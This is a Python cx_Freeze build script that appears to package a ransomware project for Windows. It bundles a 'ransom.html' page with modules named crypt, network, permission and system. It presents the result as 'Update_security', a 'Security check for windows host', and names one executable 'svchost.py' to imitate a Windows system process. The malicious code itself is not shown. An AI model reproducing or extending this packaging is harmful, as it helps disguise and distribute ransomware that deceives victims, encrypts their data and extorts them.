#!/usr/bin/python
#coding:utf-8
import sys
from cx_Freeze import setup, Executable

path = sys.path
includefiles = ['assets/image.jpg', 'assets/ransom.html']
includes = []
excludes = []
packages = ["modules/crypt", "modules/network", "modules/permission", "modules/system"]

options = {"path": path,
           "include_files": includefiles,
           "includes": includes,
           "excludes": excludes,
           "packages": packages
           }

base = None
if (sys.platform == "win32"):
    base = "Win32GUI"
setup(
	name = "Update_security",
	version = "2.0",
	description = "Security check for windows host",
    options = {"build_exe": options},
	executables = [Executable("main.py", base=base),
                    Executable("GuiCounter.py", base=base),
                    Executable("svchost.py", base=base)]
)
